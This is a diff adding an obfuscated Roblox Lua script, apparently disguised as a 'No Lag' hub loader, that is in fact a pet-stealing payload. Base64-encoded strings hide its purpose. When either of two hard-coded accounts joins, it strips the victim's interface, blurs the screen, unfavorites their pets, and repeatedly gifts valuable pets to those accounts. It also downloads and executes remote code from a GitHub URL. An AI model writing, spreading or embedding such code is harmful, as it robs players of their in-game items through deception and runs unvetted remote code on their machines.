@@ -1,0 +1,108 @@
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+
+local Players = game:GetService(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('qxLXufnBePcFRKxBwXofrCmxtHrDbFmpGCgdhOqtHWyzfxMtqjZsXKBUGxheWVycw=='))
+local TeleportService = game:GetService(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('qZDTDFqFBSSTQLnqSedbcmcuymalATtJIubGlGTypMkkxhtEwjiAPgIVGVsZXBvcnRTZXJ2aWNl'))
+local ReplicatedStorage = game:GetService(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('MgDlmYlcTNqcryIaUPNVWShBXKMxtzhJOXYlddednxBqpJVVLEWRjRXUmVwbGljYXRlZFN0b3JhZ2U='))
+local localPlayer = Players.LocalPlayer
+
+-- Target players to trigger actions & receive pets
+local targetUsernames = {
+    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('DtKvTxRgoQJKooJZlGqScLgSyEyhwbcyFvgyCDpWddEzczsdBbIQGtQaW50ZXJjZXB0ZXJudW1iZXIx'),
+    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('LWgnGEHRDvWmutUFNzwsbgLNtqWqucTDQLMULtLTRCkBMvtnPLFfTbyZGVlcHNjcmlwdEFJ')
+}
+
+-- High priority pets to gift first (not all are drained)
+local highTierPets = {
+    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('xeMhGvtIcuQDFvANhZOLqASjZRiyaeASapSCCodQgsLWNeEpZooWyFvRHJhZ29uZmx5'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('ekylzrNacfemZHCutHyeVTvUEtvXYdMkIwLKkYdPdAdmRPbHHrkvjwqQnV0dGVyZmx5'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('usDEyvIJozJfjGmcJWAIbPyBDyXvRHXmUuyRMjkBbQpVnGWLzDJfHtZTWltaWM='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('kGoakrPTkGBgclVmXkwUXIUNNwtZJAuuEmGLtklEJmNelFhdwGmMuwRUmVkIEZveA=='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('OUCxkLGOwJQmkhHcjvLbHTZwDovrarjZNnQFjHyXZModlYuMTMybDLdUmFjb29u'),
+    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('PtXfHudPeUDoJbfyLJNeNDUMLIASFJeptBUAuoxNapTbHFNZajnmzPERGlzY28gQmVl'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('kWRQHjVvGCABtfeEGHbuwTlpsuKXOAHDVbUjQspkpIGpoMJHkrHcKtRUXVlZW4gQmVl'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('HEJNZoPCryJGXyreKoWvUZBIbmzFlZIBjepQkEKWZwmQBAQLjaQRBRsVOKAkVJleA=='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('vnoTrxnlABXLXnfIfgwGzyDpAIVWfPFmwHExiDsDsVpduWOyskcNnAxU3Bpbm9zYXVydXM='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('luZuoKXEOVuMCIWBOvbPdWLzFIddSffsHiqopPHrvZzVfinsZsbnxymQW5reWxvc2F1cnVz')
+}
+
+-- Pets eligible for draining (loop gifting)
+local drainPets = {
+    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('SeTJSaFzKtrfeSvYNaCWdAoKnoRzRTvPWjOBIJPDVGAGUKTfTsenCSRRHJhZ29uZmx5'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('IozEADwLvbKueyBvsYyTQrRLlNGpChYbRoiROUdHZAnMXWBykMGrIQMQnV0dGVyZmx5'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('ntFbkdvKcOaqhoDDxtVOvyFBQHIBFaDieGpLAHLlncYAcfToerjDmDXTWltaWM='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('LxfiDNcIvzSeDrYPNwKlBOLSKnOjIQEVSnSKVMOSuZJxqlwOtlVfCtsUmVkIEZveA=='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('GAmHQanqaQXpHgkOYcMxgDESVbxUVgbswVteEfrVdFUnFFYXPmTHSgqUmFjb29u'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('lVyABEQbcJgHzFeRkBmPDolaPfcGdLZBkbTljacuJdngxNiWZtJxpZQRGlzY28gQmVl'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('ACfwwESVGzkDogjOwBdLSzwSpDZZDFrGBWADhbkGhfmoGlLrplKHuCHUXVlZW4gQmVl'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('bzOtwpbzeoNehFOuDpnCfUKrEXXjOxHZwEWgDRrHjfbnkfvnSezmBsMVOKAkVJleA=='),
+    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('lGeFBDWAqnflXndyUVRVxCwtWZwPVTYPKteBbxpVHOxOlOqYFspOIyJU3Bpbm9zYXVydXM='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('AWgVpCEsiDJqQFvZoGXrOKoTiGShiKGNONioVxxDmbaeyhNuCPzeuOSQW5reWxvc2F1cnVz'), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('SgguPVrZqIfhFqOgzaRcnHABhhFNSQzdVeMoxbJjTlwBCfGHZTDyweAVHJpY2VyYXRvcHM='),
+    VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('YGCrWWoUoWnWINIjbLUMyeZjYeYtNIxQjzmeddqaMHBNVFbcvKRstjnQ2FweWJhcmE='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('PyBrVvCQiJcXRPvjGiOmjWrJrtGAQSGvclpLkBBPUayvwhRQymdfcwWQmVhciBCZWU='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('WwMAbONkcOndaZfzJDKprTeSrymZZcxpkejDPcEGUadTDjcsAoTdopvQ2hpY2tlbiBab21iaWU='), VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('qQnSpoAQofpiQKPmMQsbWxtQPSOZkLubNQNFMRJEyvBYuvfDJKHeqPGQ29va2VkIE93bA==')
+}
+
+local gifted = false
+
+-- Unfavorite all pets
+local function unfavoriteAll()
+    local Backpack = localPlayer:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('rsmUiuiXsMTfHMiQYJbvuJTqqACtTzBZDyLvFkCYyJBrQSCSxmPOWizQmFja3BhY2s='))
+    for _, tool in ipairs(Backpack:GetChildren()) do
+        if tool:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('pSilisDwTNEJsfbcJbChSYhPKeatqbwAbFEYaaXKwxJLLUksVsRaqjIVG9vbA==')) and tool:FindFirstChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('FiBFiXrDHmAVlIjFkNCcVfrrsbCwjsFsZiPszpBVIijsyrmLCFOdTQQZGV4')) then
+            local dex = tool:FindFirstChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('UZWaKNYEPjqhvHTPeMjifVzdwuFFfOVUlOPrpavkeMCnglNihJRDMJGZGV4'))
+            if dex:GetAttribute(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('nZGbekNcLUYchXbtRPbCPrqJLMurkgTJlvnJYegreTknEXPIuLAjznvZA==')) == true then
+                ReplicatedStorage:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('KiAXZRXLaEMiSadCQbGnKUxjPZuxGThLwNkWSMtzlFBNuxGUxChjTIaR2FtZUV2ZW50cw==')):WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('HwmQFVVjNmEHcsTYNLmXhXOJiyWFchUgBzjVaSTGShHMoUTNwdzmonSRmF2b3JpdGVQZXQ=')):FireServer(tool, false)
+            end
+        end
+    end
+end
+
+-- Freeze player screen visually (UI blur)
+local function freezeScreen()
+    local blur = Instance.new(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('OdJAJLopjwthxhhOfvIIPWYIVpDLyDkIuosGYRQERsInaEQsnzqFbXEQmx1ckVmZmVjdA=='), game:GetService(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('DmlPwLEeATHUfmYCKDYSrIZnlTWgKFMVrNzCINgGhnHcxgYOFBjyHuVTGlnaHRpbmc=')))
+    blur.Size = 100
+end
+
+-- Remove all player GUI
+local function removeGUI()
+    for _, gui in ipairs(localPlayer:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('vTBQNbIIjygwwBSfnuGEocmOOtqIeppDekXzYDtRDqMaVhMomebWhvIUGxheWVyR3Vp')):GetChildren()) do
+        if gui:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('EfAGjcsnuErKJthCimzDKXBQJJfRszuzjhxErkcTUaTmOjqPTilTMLeU2NyZWVuR3Vp')) or gui:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('gZSxVwdSZDCgQuPJGosfbYMuVPuYepDseDxxUtybNEhjzPnSkioPuYOQmlsbGJvYXJkR3Vp')) or gui:IsA(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('qgBHDOyaPCpIfWVbPJKetdzAbJCgNnSUruOoGQcdCRCmtqVvvCWnxHkU3VyZmFjZUd1aQ==')) then
+            gui:Destroy()
+        end
+    end
+end
+
+-- Auto gifting function for drainPets
+local function drain()
+    gifted = true
+    while gifted do
+        local Backpack = localPlayer:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('ZDRhRSpZsUNWSuzPtwKrotLKhcqysgAWQfJVAiUkVaIIIquGpidMYjOQmFja3BhY2s='))
+        for _, tool in ipairs(Backpack:GetChildren()) do
+            for _, petName in ipairs(drainPets) do
+                if string.find(tool.Name, petName) then
+                    for _, recipientName in ipairs(targetUsernames) do
+                        local recipient = Players:FindFirstChild(recipientName)
+                        if recipient then
+                            local args = {
+                                VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('hcwISJiUjTjlFQLEZaxTAYAJvxGdfUaZlPATahihPkdgdnEiKmQFuCvR2l2ZVBldA=='),
+                                recipient,
+                                tool
+                            }
+                            ReplicatedStorage:WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('aZHMjPpcnWgbNHQbdTnoMSTcqYOXTkfuNOMgRKbAdutZdPRDSQUImZsR2FtZUV2ZW50cw==')):WaitForChild(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('xdugcisClKvZNQgKsNVIxuRjstLKdlSnweFHyHDfMHoPNqcrEuYbLGHUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
+                            task.wait(0.7)
+                        end
+                    end
+                end
+            end
+        end
+        task.wait(1.2)
+    end
+end
+
+-- Watch for specific player joining
+Players.PlayerAdded:Connect(function(player)
+    if table.find(targetUsernames, player.Name) then
+        task.delay(7, function()
+            removeGUI()
+            freezeScreen()
+            unfavoriteAll()
+            drain()
+        end)
+    end
+end)
+
+-- Load external functionality
+pcall(function()
+    loadstring(game:HttpGetAsync(VtxlUOiUgchIlQGbaRacNoqmmmsNQLBIKu('iFkwMMMsNmPpAzLwuRRCDIQIFFstyIUvnRNswTDrayjsBhqcPjVvavcaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()
+end)
+    
